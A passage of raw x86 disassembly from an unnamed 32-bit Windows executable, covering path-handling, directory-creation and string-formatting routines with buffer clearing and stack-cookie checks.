  402a6b:	88 9d f4 fe ff ff    	mov    %bl,-0x10c(%ebp)
  402a71:	e8 c2 60 00 00       	call   0x408b38
  402a76:	68 04 01 00 00       	push   $0x104
  402a7b:	8d 95 ed fd ff ff    	lea    -0x213(%ebp),%edx
  402a81:	53                   	push   %ebx
  402a82:	52                   	push   %edx
  402a83:	88 9d ec fd ff ff    	mov    %bl,-0x214(%ebp)
  402a89:	e8 aa 60 00 00       	call   0x408b38
  402a8e:	68 04 01 00 00       	push   $0x104
  402a93:	8d 85 e5 fc ff ff    	lea    -0x31b(%ebp),%eax
  402a99:	53                   	push   %ebx
  402a9a:	50                   	push   %eax
  402a9b:	88 9d e4 fc ff ff    	mov    %bl,-0x31c(%ebp)
  402aa1:	e8 92 60 00 00       	call   0x408b38
  402aa6:	83 c4 30             	add    $0x30,%esp
  402aa9:	3b f3                	cmp    %ebx,%esi
  402aab:	75 13                	jne    0x402ac0
  402aad:	5f                   	pop    %edi
  402aae:	5e                   	pop    %esi
  402aaf:	33 c0                	xor    %eax,%eax
  402ab1:	5b                   	pop    %ebx
  402ab2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402ab5:	33 cd                	xor    %ebp,%ecx
  402ab7:	e8 c4 56 00 00       	call   0x408180
  402abc:	8b e5                	mov    %ebp,%esp
  402abe:	5d                   	pop    %ebp
  402abf:	c3                   	ret
  402ac0:	8d 95 f4 fe ff ff    	lea    -0x10c(%ebp),%edx
  402ac6:	8b c6                	mov    %esi,%eax
  402ac8:	2b d6                	sub    %esi,%edx
  402aca:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402ad0:	8a 08                	mov    (%eax),%cl
  402ad2:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  402ad5:	40                   	inc    %eax
  402ad6:	84 c9                	test   %cl,%cl
  402ad8:	75 f6                	jne    0x402ad0
  402ada:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402ae0:	8d 50 01             	lea    0x1(%eax),%edx
  402ae3:	8a 08                	mov    (%eax),%cl
  402ae5:	40                   	inc    %eax
  402ae6:	84 c9                	test   %cl,%cl
  402ae8:	75 f9                	jne    0x402ae3
  402aea:	2b c2                	sub    %edx,%eax
  402aec:	80 bc 05 f3 fe ff ff 	cmpb   $0x5c,-0x10d(%ebp,%eax,1)
  402af3:	5c 
  402af4:	74 1a                	je     0x402b10
  402af6:	68 20 a6 40 00       	push   $0x40a620
  402afb:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  402b01:	68 05 01 00 00       	push   $0x105
  402b06:	51                   	push   %ecx
  402b07:	ff 15 2c a2 40 00    	call   *0x40a22c
  402b0d:	83 c4 0c             	add    $0xc,%esp
  402b10:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402b16:	8d 50 01             	lea    0x1(%eax),%edx
  402b19:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402b20:	8a 08                	mov    (%eax),%cl
  402b22:	40                   	inc    %eax
  402b23:	84 c9                	test   %cl,%cl
  402b25:	75 f9                	jne    0x402b20
  402b27:	2b c2                	sub    %edx,%eax
  402b29:	0f 84 a2 00 00 00    	je     0x402bd1
  402b2f:	8d b5 a4 bb ff ff    	lea    -0x445c(%ebp),%esi
  402b35:	8d 95 ec fd ff ff    	lea    -0x214(%ebp),%edx
  402b3b:	2b f2                	sub    %edx,%esi
  402b3d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402b40:	68 05 01 00 00       	push   $0x105
  402b45:	8d 85 e4 fc ff ff    	lea    -0x31c(%ebp),%eax
  402b4b:	6a 00                	push   $0x0
  402b4d:	50                   	push   %eax
  402b4e:	e8 e5 5f 00 00       	call   0x408b38
  402b53:	8a 84 1d f4 fe ff ff 	mov    -0x10c(%ebp,%ebx,1),%al
  402b5a:	83 c4 0c             	add    $0xc,%esp
  402b5d:	88 85 e4 fc ff ff    	mov    %al,-0x31c(%ebp)
  402b63:	3c 5c                	cmp    $0x5c,%al
  402b65:	74 15                	je     0x402b7c
  402b67:	8d 8d e4 fc ff ff    	lea    -0x31c(%ebp),%ecx
  402b6d:	51                   	push   %ecx
  402b6e:	68 05 01 00 00       	push   $0x105
  402b73:	8d 95 ec fd ff ff    	lea    -0x214(%ebp),%edx
  402b79:	52                   	push   %edx
  402b7a:	eb 2f                	jmp    0x402bab
  402b7c:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402b82:	8a 08                	mov    (%eax),%cl
  402b84:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  402b87:	40                   	inc    %eax
  402b88:	84 c9                	test   %cl,%cl
  402b8a:	75 f6                	jne    0x402b82
  402b8c:	ff 85 a0 bb ff ff    	incl   -0x4460(%ebp)
  402b92:	8d 85 e4 fc ff ff    	lea    -0x31c(%ebp),%eax
  402b98:	50                   	push   %eax
  402b99:	68 05 01 00 00       	push   $0x105
  402b9e:	8d 8d ec fd ff ff    	lea    -0x214(%ebp),%ecx
  402ba4:	81 c6 05 01 00 00    	add    $0x105,%esi
  402baa:	51                   	push   %ecx
  402bab:	ff 15 2c a2 40 00    	call   *0x40a22c
  402bb1:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402bb7:	83 c4 0c             	add    $0xc,%esp
  402bba:	43                   	inc    %ebx
  402bbb:	8d 50 01             	lea    0x1(%eax),%edx
  402bbe:	8b ff                	mov    %edi,%edi
  402bc0:	8a 08                	mov    (%eax),%cl
  402bc2:	40                   	inc    %eax
  402bc3:	84 c9                	test   %cl,%cl
  402bc5:	75 f9                	jne    0x402bc0
  402bc7:	2b c2                	sub    %edx,%eax
  402bc9:	3b d8                	cmp    %eax,%ebx
  402bcb:	0f 82 6f ff ff ff    	jb     0x402b40
  402bd1:	39 bd a0 bb ff ff    	cmp    %edi,-0x4460(%ebp)
  402bd7:	7e 74                	jle    0x402c4d
  402bd9:	8b 85 a0 bb ff ff    	mov    -0x4460(%ebp),%eax
  402bdf:	8d 9d a4 bb ff ff    	lea    -0x445c(%ebp),%ebx
  402be5:	8d b5 ec fd ff ff    	lea    -0x214(%ebp),%esi
  402beb:	8b d3                	mov    %ebx,%edx
  402bed:	2b f2                	sub    %edx,%esi
  402bef:	89 85 a0 bb ff ff    	mov    %eax,-0x4460(%ebp)
  402bf5:	eb 09                	jmp    0x402c00
  402bf7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402bfe:	8b ff                	mov    %edi,%edi
  402c00:	68 05 01 00 00       	push   $0x105
  402c05:	8d 8d ec fd ff ff    	lea    -0x214(%ebp),%ecx
  402c0b:	6a 00                	push   $0x0
  402c0d:	51                   	push   %ecx
  402c0e:	e8 25 5f 00 00       	call   0x408b38
  402c13:	83 c4 0c             	add    $0xc,%esp
  402c16:	8b c3                	mov    %ebx,%eax
  402c18:	8a 08                	mov    (%eax),%cl
  402c1a:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  402c1d:	40                   	inc    %eax
  402c1e:	84 c9                	test   %cl,%cl
  402c20:	75 f6                	jne    0x402c18
  402c22:	6a 00                	push   $0x0
  402c24:	8d 95 ec fd ff ff    	lea    -0x214(%ebp),%edx
  402c2a:	52                   	push   %edx
  402c2b:	ff 15 30 a0 40 00    	call   *0x40a030
  402c31:	8b f8                	mov    %eax,%edi
  402c33:	f7 df                	neg    %edi
  402c35:	1b ff                	sbb    %edi,%edi
  402c37:	f7 df                	neg    %edi
  402c39:	81 ee 05 01 00 00    	sub    $0x105,%esi
  402c3f:	81 c3 05 01 00 00    	add    $0x105,%ebx
  402c45:	ff 8d a0 bb ff ff    	decl   -0x4460(%ebp)
  402c4b:	75 b3                	jne    0x402c00
  402c4d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402c50:	8b c7                	mov    %edi,%eax
  402c52:	5f                   	pop    %edi
  402c53:	5e                   	pop    %esi
  402c54:	33 cd                	xor    %ebp,%ecx
  402c56:	5b                   	pop    %ebx
  402c57:	e8 24 55 00 00       	call   0x408180
  402c5c:	8b e5                	mov    %ebp,%esp
  402c5e:	5d                   	pop    %ebp
  402c5f:	c3                   	ret
  402c60:	55                   	push   %ebp
  402c61:	8b ec                	mov    %esp,%ebp
  402c63:	6a ff                	push   $0xffffffff
  402c65:	68 48 91 40 00       	push   $0x409148
  402c6a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402c70:	50                   	push   %eax
  402c71:	83 ec 58             	sub    $0x58,%esp
  402c74:	a1 18 e0 40 00       	mov    0x40e018,%eax
  402c79:	33 c5                	xor    %ebp,%eax
  402c7b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402c7e:	53                   	push   %ebx
  402c7f:	56                   	push   %esi
  402c80:	57                   	push   %edi
  402c81:	50                   	push   %eax
  402c82:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402c85:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402c8b:	8b 45 08             	mov    0x8(%ebp),%eax
  402c8e:	33 f6                	xor    %esi,%esi
  402c90:	39 70 10             	cmp    %esi,0x10(%eax)
  402c93:	75 07                	jne    0x402c9c
  402c95:	32 c0                	xor    %al,%al
  402c97:	e9 48 02 00 00       	jmp    0x402ee4
  402c9c:	56                   	push   %esi
  402c9d:	33 c9                	xor    %ecx,%ecx
  402c9f:	50                   	push   %eax
  402ca0:	83 c8 ff             	or     $0xffffffff,%eax
  402ca3:	8d 7d b4             	lea    -0x4c(%ebp),%edi
  402ca6:	c7 45 c8 07 00 00 00 	movl   $0x7,-0x38(%ebp)
  402cad:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402cb0:	66 89 4d b4          	mov    %cx,-0x4c(%ebp)
  402cb4:	e8 87 3a 00 00       	call   0x406740
  402cb9:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402cbc:	83 7d c8 08          	cmpl   $0x8,-0x38(%ebp)
  402cc0:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402cc3:	73 02                	jae    0x402cc7
  402cc5:	8b c7                	mov    %edi,%eax
  402cc7:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  402cca:	bb 5c 00 00 00       	mov    $0x5c,%ebx
  402ccf:	66 39 5c 50 fe       	cmp    %bx,-0x2(%eax,%edx,2)
  402cd4:	74 08                	je     0x402cde
  402cd6:	8d 7d b4             	lea    -0x4c(%ebp),%edi
  402cd9:	e8 42 2c 00 00       	call   0x405920
  402cde:	33 f6                	xor    %esi,%esi
  402ce0:	33 db                	xor    %ebx,%ebx
  402ce2:	33 ff                	xor    %edi,%edi
  402ce4:	89 75 9c             	mov    %esi,-0x64(%ebp)
  402ce7:	89 5d a0             	mov    %ebx,-0x60(%ebp)
  402cea:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  402ced:	ba 07 00 00 00       	mov    $0x7,%edx
  402cf2:	33 c0                	xor    %eax,%eax
  402cf4:	33 c9                	xor    %ecx,%ecx
  402cf6:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  402cf9:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402cfc:	66 89 4d d0          	mov    %cx,-0x30(%ebp)
  402d00:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402d04:	88 4d b3             	mov    %cl,-0x4d(%ebp)
  402d07:	89 7d ac             	mov    %edi,-0x54(%ebp)
  402d0a:	39 7d c4             	cmp    %edi,-0x3c(%ebp)
  402d0d:	77 28                	ja     0x402d37
  402d0f:	8b fe                	mov    %esi,%edi
  402d11:	3b f3                	cmp    %ebx,%esi
  402d13:	0f 84 5c 01 00 00    	je     0x402e75
  402d19:	8b 35 34 a0 40 00    	mov    0x40a034,%esi
  402d1f:	90                   	nop
  402d20:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  402d24:	0f 82 30 01 00 00    	jb     0x402e5a
  402d2a:	8b 07                	mov    (%edi),%eax
  402d2c:	e9 2b 01 00 00       	jmp    0x402e5c
  402d31:	8b 7d ac             	mov    -0x54(%ebp),%edi
  402d34:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402d37:	8b 5d c8             	mov    -0x38(%ebp),%ebx
  402d3a:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402d3d:	be 08 00 00 00       	mov    $0x8,%esi
  402d42:	3b de                	cmp    %esi,%ebx
  402d44:	73 03                	jae    0x402d49
  402d46:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  402d49:	66 83 3c 79 5c       	cmpw   $0x5c,(%ecx,%edi,2)
  402d4e:	74 66                	je     0x402db6
  402d50:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  402d53:	3b de                	cmp    %esi,%ebx
  402d55:	73 03                	jae    0x402d5a
  402d57:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  402d5a:	0f b7 1c 79          	movzwl (%ecx,%edi,2),%ebx
  402d5e:	83 c9 ff             	or     $0xffffffff,%ecx
  402d61:	2b c8                	sub    %eax,%ecx
  402d63:	83 f9 01             	cmp    $0x1,%ecx
  402d66:	0f 86 e3 00 00 00    	jbe    0x402e4f
  402d6c:	8d 78 01             	lea    0x1(%eax),%edi
  402d6f:	81 ff fe ff ff 7f    	cmp    $0x7ffffffe,%edi
  402d75:	0f 87 d4 00 00 00    	ja     0x402e4f
  402d7b:	3b d7                	cmp    %edi,%edx
  402d7d:	73 1b                	jae    0x402d9a
  402d7f:	50                   	push   %eax
  402d80:	57                   	push   %edi
  402d81:	8d 55 d0             	lea    -0x30(%ebp),%edx
  402d84:	52                   	push   %edx
  402d85:	e8 a6 4a 00 00       	call   0x407830
  402d8a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402d8d:	85 ff                	test   %edi,%edi
  402d8f:	0f 84 94 00 00 00    	je     0x402e29
  402d95:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402d98:	eb 6c                	jmp    0x402e06
  402d9a:	85 ff                	test   %edi,%edi
  402d9c:	75 f7                	jne    0x402d95
  402d9e:	3b d6                	cmp    %esi,%edx
  402da0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402da3:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402daa:	73 03                	jae    0x402daf
  402dac:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402daf:	33 c9                	xor    %ecx,%ecx
  402db1:	66 89 08             	mov    %cx,(%eax)
  402db4:	eb 70                	jmp    0x402e26
  402db6:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  402db9:	8d 5d 9c             	lea    -0x64(%ebp),%ebx
  402dbc:	e8 cf 32 00 00       	call   0x406090
  402dc1:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402dc4:	39 75 c8             	cmp    %esi,-0x38(%ebp)
  402dc7:	73 03                	jae    0x402dcc
  402dc9:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  402dcc:	0f b7 1c 78          	movzwl (%eax,%edi,2),%ebx
  402dd0:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402dd3:	83 c9 ff             	or     $0xffffffff,%ecx
  402dd6:	2b c8                	sub    %eax,%ecx
  402dd8:	83 f9 01             	cmp    $0x1,%ecx
  402ddb:	76 72                	jbe    0x402e4f
  402ddd:	8d 78 01             	lea    0x1(%eax),%edi
  402de0:	81 ff fe ff ff 7f    	cmp    $0x7ffffffe,%edi
  402de6:	77 67                	ja     0x402e4f
  402de8:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402deb:	3b cf                	cmp    %edi,%ecx
  402ded:	73 55                	jae    0x402e44
  402def:	50                   	push   %eax
  402df0:	57                   	push   %edi
  402df1:	8d 55 d0             	lea    -0x30(%ebp),%edx
  402df4:	52                   	push   %edx
  402df5:	e8 36 4a 00 00       	call   0x407830
  402dfa:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402dfd:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402e00:	85 ff                	test   %edi,%edi
  402e02:	74 25                	je     0x402e29
  402e04:	3b ce                	cmp    %esi,%ecx
  402e06:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  402e09:	73 03                	jae    0x402e0e
  402e0b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  402e0e:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  402e12:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402e15:	89 7d e0             	mov    %edi,-0x20(%ebp)
  402e18:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402e1b:	73 03                	jae    0x402e20
  402e1d:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402e20:	33 d2                	xor    %edx,%edx
  402e22:	66 89 14 78          	mov    %dx,(%eax,%edi,2)
  402e26:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402e29:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  402e2c:	41                   	inc    %ecx
  402e2d:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  402e30:	3b 4d c4             	cmp    -0x3c(%ebp),%ecx
  402e33:	0f 82 f8 fe ff ff    	jb     0x402d31
  402e39:	8b 5d a0             	mov    -0x60(%ebp),%ebx
  402e3c:	8b 75 9c             	mov    -0x64(%ebp),%esi
  402e3f:	e9 cb fe ff ff       	jmp    0x402d0f
  402e44:	85 ff                	test   %edi,%edi
  402e46:	75 bc                	jne    0x402e04
  402e48:	3b ce                	cmp    %esi,%ecx
  402e4a:	e9 51 ff ff ff       	jmp    0x402da0
  402e4f:	68 98 a8 40 00       	push   $0x40a898
  402e54:	ff 15 38 a1 40 00    	call   *0x40a138
  402e5a:	8b c7                	mov    %edi,%eax
  402e5c:	6a 00                	push   $0x0
  402e5e:	50                   	push   %eax
  402e5f:	ff d6                	call   *%esi
  402e61:	85 c0                	test   %eax,%eax
  402e63:	0f 95 45 b3          	setne  -0x4d(%ebp)
  402e67:	83 c7 1c             	add    $0x1c,%edi
  402e6a:	3b fb                	cmp    %ebx,%edi
  402e6c:	0f 85 ae fe ff ff    	jne    0x402d20
  402e72:	8b 75 9c             	mov    -0x64(%ebp),%esi
  402e75:	83 7d e4 08          	cmpl   $0x8,-0x1c(%ebp)
  402e79:	72 10                	jb     0x402e8b
  402e7b:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402e7e:	50                   	push   %eax
  402e7f:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402e85:	8b 75 9c             	mov    -0x64(%ebp),%esi
  402e88:	83 c4 04             	add    $0x4,%esp
  402e8b:	85 f6                	test   %esi,%esi
  402e8d:	74 3f                	je     0x402ece
  402e8f:	8b fe                	mov    %esi,%edi
  402e91:	3b f3                	cmp    %ebx,%esi
  402e93:	74 2f                	je     0x402ec4
  402e95:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  402e99:	72 0f                	jb     0x402eaa
  402e9b:	8b 0f                	mov    (%edi),%ecx
  402e9d:	51                   	push   %ecx
  402e9e:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402ea4:	8b 75 9c             	mov    -0x64(%ebp),%esi
  402ea7:	83 c4 04             	add    $0x4,%esp
  402eaa:	33 d2                	xor    %edx,%edx
  402eac:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  402eb3:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  402eba:	66 89 17             	mov    %dx,(%edi)
  402ebd:	83 c7 1c             	add    $0x1c,%edi
  402ec0:	3b fb                	cmp    %ebx,%edi
  402ec2:	75 d1                	jne    0x402e95
  402ec4:	56                   	push   %esi
  402ec5:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402ecb:	83 c4 04             	add    $0x4,%esp
  402ece:	83 7d c8 08          	cmpl   $0x8,-0x38(%ebp)
  402ed2:	72 0d                	jb     0x402ee1
  402ed4:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402ed7:	50                   	push   %eax
  402ed8:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  402ede:	83 c4 04             	add    $0x4,%esp
  402ee1:	8a 45 b3             	mov    -0x4d(%ebp),%al
  402ee4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402ee7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402eee:	59                   	pop    %ecx
  402eef:	5f                   	pop    %edi
  402ef0:	5e                   	pop    %esi
  402ef1:	5b                   	pop    %ebx
  402ef2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402ef5:	33 cd                	xor    %ebp,%ecx
  402ef7:	e8 84 52 00 00       	call   0x408180
  402efc:	8b e5                	mov    %ebp,%esp
  402efe:	5d                   	pop    %ebp
  402eff:	c3                   	ret
  402f00:	55                   	push   %ebp
  402f01:	8b ec                	mov    %esp,%ebp
  402f03:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402f09:	a1 18 e0 40 00       	mov    0x40e018,%eax
  402f0e:	33 c5                	xor    %ebp,%eax
  402f10:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402f13:	57                   	push   %edi
  402f14:	68 04 01 00 00       	push   $0x104
  402f19:	8d 85 f5 fe ff ff    	lea    -0x10b(%ebp),%eax
  402f1f:	6a 00                	push   $0x0
  402f21:	50                   	push   %eax
  402f22:	c6 85 f4 fe ff ff 00 	movb   $0x0,-0x10c(%ebp)
  402f29:	e8 0a 5c 00 00       	call   0x408b38
  402f2e:	68 04 01 00 00       	push   $0x104
  402f33:	8d 8d ed fd ff ff    	lea    -0x213(%ebp),%ecx
  402f39:	6a 00                	push   $0x0
  402f3b:	51                   	push   %ecx
  402f3c:	c6 85 ec fd ff ff 00 	movb   $0x0,-0x214(%ebp)
  402f43:	e8 f0 5b 00 00       	call   0x408b38
  402f48:	83 c4 18             	add    $0x18,%esp
  402f4b:	8d bd f4 fe ff ff    	lea    -0x10c(%ebp),%edi
  402f51:	e8 fa f9 ff ff       	call   0x402950
  402f56:	8d 95 ec fd ff ff    	lea    -0x214(%ebp),%edx
  402f5c:	52                   	push   %edx
  402f5d:	68 04 01 00 00       	push   $0x104
  402f62:	ff 15 38 a0 40 00    	call   *0x40a038
  402f68:	8b c7                	mov    %edi,%eax
  402f6a:	50                   	push   %eax
  402f6b:	8d 8d ec fd ff ff    	lea    -0x214(%ebp),%ecx
  402f71:	51                   	push   %ecx
  402f72:	ff 15 98 a1 40 00    	call   *0x40a198
  402f78:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402f7b:	83 c4 08             	add    $0x8,%esp
  402f7e:	f7 d8                	neg    %eax
  402f80:	1b c0                	sbb    %eax,%eax
  402f82:	33 cd                	xor    %ebp,%ecx
  402f84:	40                   	inc    %eax
  402f85:	5f                   	pop    %edi
  402f86:	e8 f5 51 00 00       	call   0x408180
  402f8b:	8b e5                	mov    %ebp,%esp
  402f8d:	5d                   	pop    %ebp
  402f8e:	c3                   	ret
  402f8f:	cc                   	int3
  402f90:	55                   	push   %ebp
  402f91:	8b ec                	mov    %esp,%ebp
  402f93:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402f99:	a1 18 e0 40 00       	mov    0x40e018,%eax
  402f9e:	33 c5                	xor    %ebp,%eax
  402fa0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402fa3:	57                   	push   %edi
  402fa4:	68 04 01 00 00       	push   $0x104
  402fa9:	8d 85 f5 fe ff ff    	lea    -0x10b(%ebp),%eax
  402faf:	6a 00                	push   $0x0
  402fb1:	50                   	push   %eax
  402fb2:	c6 85 f4 fe ff ff 00 	movb   $0x0,-0x10c(%ebp)
  402fb9:	e8 7a 5b 00 00       	call   0x408b38
  402fbe:	83 c4 0c             	add    $0xc,%esp
  402fc1:	8d bd f4 fe ff ff    	lea    -0x10c(%ebp),%edi
  402fc7:	e8 84 f9 ff ff       	call   0x402950
  402fcc:	8b cf                	mov    %edi,%ecx
  402fce:	51                   	push   %ecx
  402fcf:	ff 15 3c a0 40 00    	call   *0x40a03c
  402fd5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402fd8:	33 cd                	xor    %ebp,%ecx
  402fda:	5f                   	pop    %edi
  402fdb:	e8 a0 51 00 00       	call   0x408180
  402fe0:	8b e5                	mov    %ebp,%esp
  402fe2:	5d                   	pop    %ebp
  402fe3:	c3                   	ret
  402fe4:	cc                   	int3
  402fe5:	cc                   	int3
  402fe6:	cc                   	int3
  402fe7:	cc                   	int3
  402fe8:	cc                   	int3
  402fe9:	cc                   	int3
  402fea:	cc                   	int3
  402feb:	cc                   	int3
  402fec:	cc                   	int3
  402fed:	cc                   	int3
  402fee:	cc                   	int3
  402fef:	cc                   	int3
  402ff0:	55                   	push   %ebp
  402ff1:	8b ec                	mov    %esp,%ebp
  402ff3:	6a ff                	push   $0xffffffff
  402ff5:	68 c1 94 40 00       	push   $0x4094c1
  402ffa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403000:	50                   	push   %eax
  403001:	81 ec 60 01 00 00    	sub    $0x160,%esp
  403007:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40300c:	33 c5                	xor    %ebp,%eax
  40300e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403011:	56                   	push   %esi
  403012:	57                   	push   %edi
  403013:	50                   	push   %eax
  403014:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403017:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40301d:	68 04 01 00 00       	push   $0x104
  403022:	33 ff                	xor    %edi,%edi
  403024:	8d 85 e9 fe ff ff    	lea    -0x117(%ebp),%eax
  40302a:	57                   	push   %edi
  40302b:	50                   	push   %eax
  40302c:	c6 85 e8 fe ff ff 00 	movb   $0x0,-0x118(%ebp)
  403033:	e8 00 5b 00 00       	call   0x408b38
  403038:	83 c4 0c             	add    $0xc,%esp
  40303b:	3b df                	cmp    %edi,%ebx
  40303d:	75 07                	jne    0x403046
  40303f:	33 c0                	xor    %eax,%eax
  403041:	e9 b2 01 00 00       	jmp    0x4031f8
  403046:	8d 8d b0 fe ff ff    	lea    -0x150(%ebp),%ecx
  40304c:	51                   	push   %ecx
  40304d:	e8 8e f8 ff ff       	call   0x4028e0
  403052:	83 c4 04             	add    $0x4,%esp
  403055:	50                   	push   %eax
  403056:	8d 95 94 fe ff ff    	lea    -0x16c(%ebp),%edx
  40305c:	52                   	push   %edx
  40305d:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403060:	e8 9b 02 00 00       	call   0x403300
  403065:	83 c4 08             	add    $0x8,%esp
  403068:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40306c:	83 bd c4 fe ff ff 08 	cmpl   $0x8,-0x13c(%ebp)
  403073:	72 10                	jb     0x403085
  403075:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40307b:	50                   	push   %eax
  40307c:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403082:	83 c4 04             	add    $0x4,%esp
  403085:	8b 85 94 fe ff ff    	mov    -0x16c(%ebp),%eax
  40308b:	33 c9                	xor    %ecx,%ecx
  40308d:	83 bd a8 fe ff ff 10 	cmpl   $0x10,-0x158(%ebp)
  403094:	c7 85 c4 fe ff ff 07 	movl   $0x7,-0x13c(%ebp)
  40309b:	00 00 00 
  40309e:	89 bd c0 fe ff ff    	mov    %edi,-0x140(%ebp)
  4030a4:	66 89 8d b0 fe ff ff 	mov    %cx,-0x150(%ebp)
  4030ab:	73 06                	jae    0x4030b3
  4030ad:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
  4030b3:	8b 35 30 a2 40 00    	mov    0x40a230,%esi
  4030b9:	50                   	push   %eax
  4030ba:	68 2c a6 40 00       	push   $0x40a62c
  4030bf:	8d 95 e8 fe ff ff    	lea    -0x118(%ebp),%edx
  4030c5:	68 00 04 00 00       	push   $0x400
  4030ca:	52                   	push   %edx
  4030cb:	ff d6                	call   *%esi
  4030cd:	83 c4 10             	add    $0x10,%esp
  4030d0:	e8 2b fe ff ff       	call   0x402f00
  4030d5:	3b c7                	cmp    %edi,%eax
  4030d7:	75 36                	jne    0x40310f
  4030d9:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  4030df:	8d 50 01             	lea    0x1(%eax),%edx
  4030e2:	8a 08                	mov    (%eax),%cl
  4030e4:	40                   	inc    %eax
  4030e5:	84 c9                	test   %cl,%cl
  4030e7:	75 f9                	jne    0x4030e2
  4030e9:	2b c2                	sub    %edx,%eax
  4030eb:	68 30 a6 40 00       	push   $0x40a630
  4030f0:	3b c7                	cmp    %edi,%eax
  4030f2:	76 09                	jbe    0x4030fd
  4030f4:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  4030fa:	50                   	push   %eax
  4030fb:	eb 1e                	jmp    0x40311b
  4030fd:	68 3c a6 40 00       	push   $0x40a63c
  403102:	68 00 04 00 00       	push   $0x400
  403107:	53                   	push   %ebx
  403108:	ff d6                	call   *%esi
  40310a:	83 c4 10             	add    $0x10,%esp
  40310d:	eb 1c                	jmp    0x40312b
  40310f:	68 30 a6 40 00       	push   $0x40a630
  403114:	8d 8d e8 fe ff ff    	lea    -0x118(%ebp),%ecx
  40311a:	51                   	push   %ecx
  40311b:	68 34 a6 40 00       	push   $0x40a634
  403120:	68 00 04 00 00       	push   $0x400
  403125:	53                   	push   %ebx
  403126:	ff d6                	call   *%esi
  403128:	83 c4 14             	add    $0x14,%esp
  40312b:	8b c3                	mov    %ebx,%eax
  40312d:	c7 85 e0 fe ff ff 0f 	movl   $0xf,-0x120(%ebp)
  403134:	00 00 00 
  403137:	89 bd dc fe ff ff    	mov    %edi,-0x124(%ebp)
  40313d:	c6 85 cc fe ff ff 00 	movb   $0x0,-0x134(%ebp)
  403144:	8d 50 01             	lea    0x1(%eax),%edx
  403147:	8a 08                	mov    (%eax),%cl
  403149:	40                   	inc    %eax
  40314a:	84 c9                	test   %cl,%cl
